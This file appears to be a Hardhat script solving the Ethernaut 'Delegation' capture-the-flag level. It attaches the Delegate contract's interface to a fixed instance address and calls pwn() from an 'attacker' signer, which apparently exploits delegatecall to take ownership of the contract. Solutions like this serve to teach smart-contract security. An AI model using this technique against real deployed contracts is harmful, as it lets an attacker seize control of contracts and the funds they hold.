const { ethers } = require("hardhat");

async function main() {
  const instanceAddress = "0xbbcd619Cd0D98f1DAE3629FA64E871047312128F";

  const [attacker] = await ethers.getSigners();
  console.log("Using this address for attack:", attacker.address);

  const Contract = await ethers.getContractFactory("Delegate");
  const contract = Contract.attach(instanceAddress);

  // Attack

  await contract.pwn({ gasLimit: 100000 });
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
